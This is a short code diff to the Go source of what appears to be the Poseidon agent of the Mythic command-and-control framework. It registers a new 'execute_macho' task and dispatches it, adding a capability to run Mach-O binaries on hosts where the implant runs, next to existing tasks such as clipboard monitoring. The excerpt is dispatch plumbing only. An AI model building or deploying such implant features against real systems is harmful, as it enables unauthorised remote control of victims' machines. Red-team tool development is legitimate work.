@@ -2,6 +2,7 @@ package main
 
 import (
 	"C"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_macho"
 
 	// Standard
 	"encoding/json"
@@ -128,6 +129,7 @@ var tasktypes = map[string]int{
 	"unlink_tcp":        46,
 	"run":               47,
 	"clipboard_monitor": 48,
+	"execute_macho":     49,
 	"none":              NONE_CODE,
 }
 
@@ -484,6 +486,9 @@ func handleNewTask() {
 				break
 			case 48:
 				go clipboard_monitor.Run(task)
+				break
+			case 49:
+				go execute_macho.Run(task)
 				break
 			case NONE_CODE:
 				// No tasks, do nothing
